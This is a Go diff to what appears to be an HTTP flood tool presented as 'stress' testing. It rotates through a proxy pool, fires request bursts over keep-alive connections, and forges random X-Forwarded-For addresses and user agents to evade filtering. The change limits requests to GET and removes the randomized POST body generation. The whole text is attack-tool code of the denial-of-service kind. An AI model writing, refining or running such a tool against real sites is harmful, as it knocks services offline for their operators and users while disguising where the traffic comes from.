@@ -21,7 +21,7 @@ import (
 // ProxyPool provides simple round-robin access to proxies
 // Workers will pick a single proxy at startup and stick with it
 // to ensure per-thread consistency
- type ProxyPool struct {
+type ProxyPool struct {
     proxies []string
 }
 
@@ -41,7 +41,7 @@ type StressConfig struct {
 }
 
 var (
-    httpMethods  = []string{"GET", "POST", "HEAD"}
+    httpMethods  = "GET"
     languages    = []string{"en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9"}
     contentTypes = []string{"application/x-www-form-urlencoded", "application/json", "text/plain"}
 )
@@ -168,7 +168,7 @@ func connect(proxyAddr, target string) (net.Conn, bool, error) {
 
 func sendBurst(conn net.Conn, cfg *StressConfig, isTLS bool, count int) {
     for i := 0; i < count; i++ {
-        method := httpMethods[rand.Intn(len(httpMethods))]
+        method := httpMethods
         header, body := buildRequest(cfg, method, isTLS)
         bufs := net.Buffers{[]byte(header)}
         if len(body) > 0 {
@@ -212,15 +212,9 @@ func buildRequest(cfg *StressConfig, method string, viaTLS bool) (string, []byte
     buf.WriteString("Accept-Encoding: gzip, deflate, br, zstd\r\n")
     buf.WriteString("Connection: keep-alive\r\n")
     buf.WriteString(fmt.Sprintf("X-Forwarded-For: %d.%d.%d.%d\r\n", rand.Intn(256), rand.Intn(256), rand.Intn(256), rand.Intn(256)))
-
-    var body []byte
-    if method == "POST" {
-        ct := contentTypes[rand.Intn(len(contentTypes))]
-        body = createBody(ct)
-        buf.WriteString(fmt.Sprintf("Content-Type: %s\r\nContent-Length: %d\r\n", ct, len(body)))
-    }
     buf.WriteString(fmt.Sprintf("Referer: https://%s/\r\n\r\n", hostHdr))
-    return buf.String(), body
+    // No body for GET requests
+    return buf.String(), nil
 }
 
 func determinePort(u *url.URL) int {
@@ -258,28 +252,4 @@ func randomUserAgent() string {
         v := fmt.Sprintf("%d.0.%d", rand.Intn(16)+600, rand.Intn(100))
         return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/%s (KHTML, like Gecko) Version=13.1 Safari/%s", os, v, v)
     }
-}
-
-func createBody(contentType string) []byte {
-    var b bytes.Buffer
-    switch contentType {
-    case "application/x-www-form-urlencoded":
-        vals := url.Values{}
-        for i := 0; i < 3; i++ {
-            vals.Set(randomString(5), randomString(8))
-        }
-        b.WriteString(vals.Encode())
-    case "application/json":
-        b.WriteByte('{')
-        for i := 0; i < 3; i++ {
-            if i > 0 {
-                b.WriteByte(',')
-            }
-            fmt.Fprintf(&b, `"%s":"%s"`, randomString(5), randomString(8))
-        }
-        b.WriteByte('}')
-    case "text/plain":
-        b.WriteString("text_" + randomString(12))
-    }
-    return b.Bytes()
 }
